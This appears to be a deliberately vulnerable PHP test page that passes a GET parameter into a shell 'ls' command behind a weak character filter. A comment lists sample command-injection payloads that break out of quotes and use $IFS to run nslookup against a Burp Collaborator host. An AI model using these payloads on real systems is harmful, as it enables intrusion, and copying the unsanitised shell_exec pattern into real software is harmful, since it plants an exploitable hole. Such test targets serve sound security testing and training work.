<?php
# filename: no_white_chars_no_colon_no_pipe_no_ampersand_no_quote.php
# vulnerable to command injection
# sample exploits:
/*
.%27%24%28nslookup%24IFS%249a1361.1ik377vz06era1jm6lmf3daljcpadz.burpcollaborator.net%29%27.
.'`nslookup$IFS$9a1369.1ik377vz06era1jm6lmf3daljcpadz.burpcollaborator.net`'.
.'$(nslookup$IFS$9a1360.1ik377vz06era1jm6lmf3daljcpadz.burpcollaborator.net)'.
.%27%60nslookup%24IFS%249a1370.1ik377vz06era1jm6lmf3daljcpadz.burpcollaborator.net%60%27.
*/

if(isset($_GET['dir'])&&!preg_match('/\s+/',$_GET['dir'])&&!preg_match('/&|\||;/',$_GET['dir']))
{
	 echo "Dir contents are:\n<br />".shell_exec("ls '{$_GET['dir']}'");
}
?>
<a href="?dir=.">clickme</a>
